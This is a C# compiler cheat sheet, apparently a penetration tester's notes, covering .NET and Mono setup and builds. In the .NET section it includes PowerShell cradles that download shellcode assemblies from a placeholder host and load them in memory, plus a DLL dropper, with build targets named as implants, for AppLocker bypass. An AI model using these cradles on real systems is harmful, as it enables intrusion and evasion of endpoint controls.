# CSharp

Search Tag(s): #command-line #compiler #dotnet

## 01 - DotNET Compiler

### 1.1 - Setup

Setup Dotnet SDK

```
$ sudo ./dotnet-install.sh -i /usr/share/dotnet -c 6.0
```

Completely uninstall specific dotnet version

```bash
SDK_VERSION="5.0.16"
DOTNET_VERSION="5.0.213"
DOTNET_UNINSTALL_PATH="/usr/share/dotnet"
rm -rf $DOTNET_UNINSTALL_PATH/sdk/$SDK_VERSION
rm -rf $DOTNET_UNINSTALL_PATH/shared/Microsoft.NETCore.App/$DOTNET_VERSION
rm -rf $DOTNET_UNINSTALL_PATH/shared/Microsoft.AspNetCore.All/$DOTNET_VERSION
rm -rf $DOTNET_UNINSTALL_PATH/shared/Microsoft.AspNetCore.App/$DOTNET_VERSION
rm -rf $DOTNET_UNINSTALL_PATH/host/fxr/$DOTNET_VERSION
```

### 1.2 - Compile Program

Create .NET Console Project.

```
> dotnet new console [-o <project_name>]
```

Compile C# Project of Windows executable

```
> dotnet publish [/path/to/project/] -r win-x64 -c Release --sc false [-p:AllowUnsafeBlocks=true] -p:PublishSingleFile=true -p:PublishTrimmed=true

> dotnet publish [/path/to/project/] -r win10-x64 -c Release --sc false [-p:AllowUnsafeBlocks=true] -p:PublishSingleFile=true -p:PublishTrimmed=true

> dotnet publish [/path/to/project/] -f net6.0 -r win-x64 -c Release --sc false [-p:AllowUnsafeBlocks=true] -p:PublishSingleFile=true -p:PublishTrimmed=true
```

Or you can just use `build`

```
> dotnet build [/path/to/project/] -r win-x64 -c Release [-p:AllowUnsafeBlocks=true] -p:PublishSingleFile=true -p:PublishTrimmed=true

> dotnet build [/path/to/project/] -r win-x64 -c Release [-p:AllowUnsafeBlocks=true] -p:PublishSingleFile=true -p:AllowUnsafeBlocks=true -p:PublishTrimmed=true
```

Download the cradle and load it from memory.

```powershell
$data = (New-Object Net.WebClient).DownloadData("http://<IP>/Shellcode.exe")
$assem = [System.Reflection.Assembly]::Load($data)
[Shell.Program()]::Main()
# [Program()]::Main()
# [Shell.Program()]::Main("".Split())
```

Create and Compile C# DLL

```
> dotnet new classlib [-o <project_name>]

> dotnet publish [/path/to/project/] -r win-x64 -c Release --sc false [-p:AllowUnsafeBlocks=true] -p:PublishTrimmed=true

> dotnet build [/path/to/project/] -r win-x64 -c Release --sc false [-p:AllowUnsafeBlocks=true] -p:PublishTrimmed=true
```

Execute shellcode.

```powershell
PS C:\> [System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("DLLDropper.dll")
[RunDLLPublicFunc.Class1]::runner()
```

Download the cradle and load it from memory.

```powershell
$data = (New-Object Net.WebClient).DownloadData("http://<IP>/Shellcode.dll")
$assembly = [System.Reflection.Assembly]::Load($data)
$class = $assembly.GetType("Shellcode.Class1")
$method = $class.GetMethod("<method_name>")
$method.Invoke(0, $null)
```

## 02 - Mono Compiler

### 2.1 - Setup

#### 2.1.1 - Install via package manager

##### 2.1.1.1 - Ubuntu distros

Add the repository.

```
$ sudo apt install -y ca-certificates gnupg
sudo gpg --homedir /tmp --no-default-keyring --keyring /usr/share/keyrings/mono-official-archive-keyring.gpg --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF
echo "deb [signed-by=/usr/share/keyrings/mono-official-archive-keyring.gpg] https://download.mono-project.com/repo/ubuntu stable-focal main" | sudo tee /etc/apt/sources.list.d/mono-official-stable.list
sudo apt update
```

##### 2.1.1.2 - Debian distros

```
$ sudo apt install -y dirmngr ca-certificates gnupg
sudo gpg --homedir /tmp --no-default-keyring --keyring /usr/share/keyrings/mono-official-archive-keyring.gpg --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF
echo "deb [signed-by=/usr/share/keyrings/mono-official-archive-keyring.gpg] https://download.mono-project.com/repo/debian stable-buster main" | sudo tee /etc/apt/sources.list.d/mono-official-stable.list
sudo apt update
```

Install the package.

```
$ sudo apt install -y mono-complete
```

##### 2.1.1.3 - Arch distros

```
$ sudo pacman -S --noconfirm mono
```

#### 2.1.2 - Manually install the compiler

Install required dependencies.

```
$ sudo apt install -y git autoconf libtool automake build-essential gettext cmake python3 curl
```

Download a stable release package and install it.

```
$ wget https://download.mono-project.com/sources/mono/mono-6.12.0.199.tar.xz && \
tar xf mono-6.12.0.199.tar.xz && cd mono-6.12.0.199 && \
./configure --prefix=/usr/local/ && make && make install
```

### 2.2 - Compile Program

Build a solution project.

```
$ xbuild file.csproj

$ xbuild file.sln
```

Compile a `.exe` binary.

```
$ mcs [-unsafe-] -sdk:<2 | 4 | 4.5> -out:implant.exe [-recurse:*.cs] Program.cs
```

Compile a `.dll` binary.

```
$ mcs [-unsafe-] -sdk:<2 | 4 | 4.5> -target:library -out:implant.dll [-recurse:*.cs] Program.cs
```

---
## References

- [Mono Project](https://www.mono-project.com/)

- [Arch Linux Wiki .NET](https://wiki.archlinux.org/title/.NET)

- [Pentestlab Blog: Applocker Bypass Assembly Load](https://pentestlab.blog/2017/06/06/applocker-bypass-assembly-load/)

- [https://dotnet.microsoft.com/en-us/download/dotnet-framework/net481](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net481)